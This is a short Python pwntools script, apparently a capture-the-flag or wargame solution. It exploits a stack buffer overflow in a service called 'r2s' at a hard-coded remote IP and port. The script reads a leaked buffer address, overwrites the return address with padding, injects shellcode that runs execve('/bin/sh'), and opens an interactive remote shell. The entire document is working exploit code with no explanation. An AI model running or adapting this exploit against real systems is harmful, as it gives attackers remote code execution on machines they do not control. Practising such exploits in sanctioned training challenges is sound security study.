from pwn import *

context.arch = 'amd64'
#p = process('./r2s')
p = remote('147.46.113.56', 25394)

p.recvuntil(b'buf: ')
buf_leak = int(p.recvline(drop=True), 16)

payload = b''
payload += b'A' * 80
payload += b'B' * 8
payload += p64(buf_leak + 80 + 0x10)
payload += asm(f'''
    {shellcraft.pushstr('/bin/sh')}
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    '''
)
p.recvuntil(b'Input: ')
p.send(payload)

p.interactive()